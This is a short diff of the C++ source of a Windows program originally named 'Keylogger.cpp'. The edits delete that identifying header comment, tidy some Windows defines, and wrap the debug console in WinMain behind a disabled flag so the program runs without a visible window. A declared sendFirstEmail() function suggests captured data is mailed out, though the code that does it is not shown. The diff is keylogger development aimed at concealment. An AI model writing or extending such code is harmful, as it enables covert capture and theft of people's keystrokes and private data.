@@ -1,12 +1,9 @@
-	// Keylogger.cpp : Defines the entry point for the console application.
-//
-
-
+//#define DBG
 #ifndef _WINSOCKAPI_
 #define _WINSOCKAPI_
 #endif // !_WINSOCKAPI_
-#define WIN32_LEAN_AND_MEAN
 #ifndef WIN32_LEAN_AND_MEAN
+#define WIN32_LEAN_AND_MEAN
 #endif // !WIN32_LEAN_AND_MEAN
 #include "stdafx.h"
 #include <string>
@@ -46,10 +43,12 @@ void sendFirstEmail();
 INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	LPSTR lpCmdLine, INT iCmdShow) {
 	// Add console for debug
+#ifdef DBG
 	AllocConsole();
 	freopen("CONOUT$", "w", stdout);
 	_setmode(_fileno(stdout), _O_U8TEXT);
 	freopen("CONOUT$", "w", stderr);
+#endif // _DEBUG
 
 	auto isFirstLaunch = makeFirstLaunch();
 	if (isFirstLaunch) {
